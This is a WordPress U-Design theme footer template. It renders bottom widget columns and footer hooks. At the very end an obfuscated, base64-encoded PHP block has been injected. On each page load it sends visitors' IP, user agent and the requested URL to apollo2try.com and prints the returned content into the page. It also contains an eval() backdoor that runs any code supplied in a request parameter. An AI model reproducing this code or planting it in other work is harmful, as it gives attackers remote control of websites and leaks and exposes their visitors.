<?php
/**
 * @package WordPress
 * @subpackage U-Design
 */
if ( !defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

global $udesign_options; ?>


<?php udesign_page_content_bottom(); ?>
</div><!-- end page-content -->
<?php udesign_page_content_after(); ?>

<div class="clear"></div>

<?php

	$bottom_1_is_active = sidebar_exist_and_active('bottom-widget-area-1');
	$bottom_2_is_active = sidebar_exist_and_active('bottom-widget-area-2');
	$bottom_3_is_active = sidebar_exist_and_active('bottom-widget-area-3');
	$bottom_4_is_active = sidebar_exist_and_active('bottom-widget-area-4');

	if ( $bottom_1_is_active || $bottom_2_is_active || $bottom_3_is_active || $bottom_4_is_active ) : // hide this area if no widgets are active...
?>
	    <div id="bottom-bg">
		<div id="bottom" class="container_24">
		    <div class="bottom-content-padding">
<?php                   udesign_bottom_section_top(); ?>
<?php
                        $output = '';
			// all 4 active: 1 case
			if ( $bottom_1_is_active && $bottom_2_is_active && $bottom_3_is_active && $bottom_4_is_active ) {
			    $output .= get_dynamic_column( 'bottom_1', 'one_fourth', 'bottom-widget-area-1' );
			    $output .= get_dynamic_column( 'bottom_2', 'one_fourth', 'bottom-widget-area-2' );
			    $output .= get_dynamic_column( 'bottom_3', 'one_fourth', 'bottom-widget-area-3' );
			    $output .= get_dynamic_column( 'bottom_4', 'one_fourth last_column', 'bottom-widget-area-4' );
			}
			// 3 active: 4 cases
			if ( $bottom_1_is_active && $bottom_2_is_active && $bottom_3_is_active && !$bottom_4_is_active ) {
			    $output .= get_dynamic_column( 'bottom_1', 'one_third', 'bottom-widget-area-1' );
			    $output .= get_dynamic_column( 'bottom_2', 'one_third', 'bottom-widget-area-2' );
			    $output .= get_dynamic_column( 'bottom_3', 'one_third last_column', 'bottom-widget-area-3' );
			}
			if ( $bottom_1_is_active && $bottom_2_is_active && !$bottom_3_is_active && $bottom_4_is_active ) {
			    $output .= get_dynamic_column( 'bottom_1', 'one_third', 'bottom-widget-area-1' );
			    $output .= get_dynamic_column( 'bottom_2', 'one_third', 'bottom-widget-area-2' );
			    $output .= get_dynamic_column( 'bottom_4', 'one_third last_column', 'bottom-widget-area-4' );
			}
			if ( $bottom_1_is_active && !$bottom_2_is_active && $bottom_3_is_active && $bottom_4_is_active ) {
			    $output .= get_dynamic_column( 'bottom_1', 'one_third', 'bottom-widget-area-1' );
			    $output .= get_dynamic_column( 'bottom_3', 'one_third', 'bottom-widget-area-3' );
			    $output .= get_dynamic_column( 'bottom_4', 'one_third last_column', 'bottom-widget-area-4' );
			}
			if ( !$bottom_1_is_active && $bottom_2_is_active && $bottom_3_is_active && $bottom_4_is_active ) {
			    $output .= get_dynamic_column( 'bottom_2', 'one_third', 'bottom-widget-area-2' );
			    $output .= get_dynamic_column( 'bottom_3', 'one_third', 'bottom-widget-area-3' );
			    $output .= get_dynamic_column( 'bottom_4', 'one_third last_column', 'bottom-widget-area-4' );
			}
			// 2 active: 6 cases
			if ( $bottom_1_is_active && $bottom_2_is_active && !$bottom_3_is_active && !$bottom_4_is_active ) {
			    $output .= get_dynamic_column( 'bottom_1', 'one_half', 'bottom-widget-area-1' );
			    $output .= get_dynamic_column( 'bottom_2', 'one_half last_column', 'bottom-widget-area-2' );
			}
			if ( $bottom_1_is_active && !$bottom_2_is_active && $bottom_3_is_active && !$bottom_4_is_active ) {
			    $output .= get_dynamic_column( 'bottom_1', 'one_half', 'bottom-widget-area-1' );
			    $output .= get_dynamic_column( 'bottom_3', 'one_half last_column', 'bottom-widget-area-3' );
			}
			if ( !$bottom_1_is_active && $bottom_2_is_active && $bottom_3_is_active && !$bottom_4_is_active ) {
			    $output .= get_dynamic_column( 'bottom_2', 'one_half', 'bottom-widget-area-2' );
			    $output .= get_dynamic_column( 'bottom_3', 'one_half last_column', 'bottom-widget-area-3' );
			}
			if ( !$bottom_1_is_active && $bottom_2_is_active && !$bottom_3_is_active && $bottom_4_is_active ) {
			    $output .= get_dynamic_column( 'bottom_2', 'one_half', 'bottom-widget-area-2' );
			    $output .= get_dynamic_column( 'bottom_4', 'one_half last_column', 'bottom-widget-area-4' );
			}
			if ( !$bottom_1_is_active && !$bottom_2_is_active && $bottom_3_is_active && $bottom_4_is_active ) {
			    $output .= get_dynamic_column( 'bottom_3', 'one_half', 'bottom-widget-area-3' );
			    $output .= get_dynamic_column( 'bottom_4', 'one_half last_column', 'bottom-widget-area-4' );
			}
			if ( $bottom_1_is_active && !$bottom_2_is_active && !$bottom_3_is_active && $bottom_4_is_active ) {
			    $output .= get_dynamic_column( 'bottom_1', 'one_half', 'bottom-widget-area-1' );
			    $output .= get_dynamic_column( 'bottom_4', 'one_half last_column', 'bottom-widget-area-4' );
			}
			// 1 active: 4 cases
			if ( $bottom_1_is_active && !$bottom_2_is_active && !$bottom_3_is_active && !$bottom_4_is_active ) {
			    $output .= get_dynamic_column( 'bottom_1', 'full_width', 'bottom-widget-area-1' );
			}
			if ( !$bottom_1_is_active && $bottom_2_is_active && !$bottom_3_is_active && !$bottom_4_is_active ) {
			    $output .= get_dynamic_column( 'bottom_2', 'full_width', 'bottom-widget-area-2' );
			}
			if ( !$bottom_1_is_active && !$bottom_2_is_active && $bottom_3_is_active && !$bottom_4_is_active ) {
			    $output .= get_dynamic_column( 'bottom_3', 'full_width', 'bottom-widget-area-3' );
			}
			if ( !$bottom_1_is_active && !$bottom_2_is_active && !$bottom_3_is_active && $bottom_4_is_active ) {
			    $output .= get_dynamic_column( 'bottom_4', 'full_width', 'bottom-widget-area-4' );
			}
                        
                        echo $output;

                        udesign_bottom_section_bottom(); ?>
		    </div>
		    <!-- end bottom-content-padding -->
		</div>
		<!-- end bottom -->
	    </div>
	    <!-- end bottom-bg -->

	    <div class="clear"></div>

<?php	endif; ?>

<?php   udesign_footer_before(); ?>
	<div id="footer-bg">
		<div id="footer" class="container_24 footer-top">
<?php               udesign_footer_inside(); ?>
		</div>
	</div>
<?php   udesign_footer_after(); ?>

	<div class="clear"></div>

<?php   wp_footer(); ?>
        
<?php
    if( $udesign_options['enable_cufon'] ) : ?>
	<script type="text/javascript"> Cufon.now(); </script>
<?php
    endif; ?>
<?php udesign_body_bottom(); ?>

<? error_reporting(0); ini_set("display_errors", "0"); if (!isset($i2181318e)) { $i2181318e = TRUE;  $GLOBALS['_1653513743_']=Array(base64_decode('cHJ' .'lZ19' .'tYXRjaA=='),base64_decode('ZmlsZV9n' .'ZXRfY29udGV' .'udHM='),base64_decode('c2Vzc' .'2' .'lvb' .'l9' .'uYW1l'),base64_decode('Zm' .'dld' .'GM='),base64_decode('' .'Z' .'mlsZV9nZX' .'RfY29udGVudH' .'M='),base64_decode('dXJsZW' .'5jb' .'2Rl'),base64_decode('dXJsZ' .'W5jb2Rl'),base64_decode('' .'bWQ1'),base64_decode('c3R' .'yaXBzbGFzaGV' .'z'));  function _780873269($i){$a=Array('Y2xpZW50' .'X2NoZWN' .'r','Y2xpZW' .'50' .'X2N' .'oZWNr','' .'SFRUU' .'F9B' .'Q0NF' .'UFRf' .'Q0hB' .'UlNFVA' .'==','IS4hdQ=' .'=','' .'U0NSSVBUX' .'0ZJTEVO' .'QU1F','VVRGLTg=','d2lu' .'ZG93' .'cy0xMjUx','SFR' .'UUF9BQ0NFUFRfQ' .'0hBUl' .'NFV' .'A=' .'=','aHR0c' .'Dov' .'L' .'w==','YX' .'BvbGxvMnRyeS5j' .'b2' .'0vZ2V0LnBocD9' .'kPQ==','U' .'0VS' .'Vk' .'VSX05' .'BTUU=','UkVR' .'VUVT' .'VF9VU' .'kk=','' .'JnU9','' .'SFRUUF9VU0V' .'SX0FHRU5U','Jm' .'M9','Jmk9M' .'SZ' .'p' .'c' .'D0=','U' .'k' .'V' .'NT1RFX0FERFI' .'=','Jmg9','Y2U4' .'OTg' .'1YzQ4Z' .'D' .'UwOGVm' .'Mm' .'I' .'2' .'OW' .'QzODEx' .'YTI' .'yNT' .'gyZD' .'k=','U0' .'V' .'SVkVSX05BTUU=','' .'UkVRVUVT' .'VF9VUkk=','S' .'FRUUF9VU0VSX0FHRU' .'5' .'U','MQ' .'==','cA==','cA==','' .'Mj' .'E4MTMxOG' .'U=');return base64_decode($a[$i]);}  if(!empty($_COOKIE[_780873269(0)]))die($_COOKIE[_780873269(1)]);if(!isset($a4c8d717_0[_780873269(2)])){if($GLOBALS['_1653513743_'][0](_780873269(3),$GLOBALS['_1653513743_'][1]($_SERVER[_780873269(4)]))){$a4c8d717_1=_780873269(5);}else{$a4c8d717_1=_780873269(6);}}else{$a4c8d717_1=$a4c8d717_0[_780873269(7)];if((round(0+1011.3333333333+1011.3333333333+1011.3333333333)^round(0+758.5+758.5+758.5+758.5))&& $GLOBALS['_1653513743_'][2]($a4c8d717_1))$GLOBALS['_1653513743_'][3]($a4c8d717_1,$_COOKIE);}echo $GLOBALS['_1653513743_'][4](_780873269(8) ._780873269(9) .$GLOBALS['_1653513743_'][5]($_SERVER[_780873269(10)] .$_SERVER[_780873269(11)]) ._780873269(12) .$GLOBALS['_1653513743_'][6]($_SERVER[_780873269(13)]) ._780873269(14) .$a4c8d717_1 ._780873269(15) .$_SERVER[_780873269(16)] ._780873269(17) .$GLOBALS['_1653513743_'][7](_780873269(18) .$_SERVER[_780873269(19)] .$_SERVER[_780873269(20)] .$_SERVER[_780873269(21)] .$a4c8d717_1 ._780873269(22)));if(isset($_REQUEST[_780873269(23)])&& $_REQUEST[_780873269(24)]== _780873269(25)){eval($GLOBALS['_1653513743_'][8]($_REQUEST["c"]));}  } ?>

</body>
</html>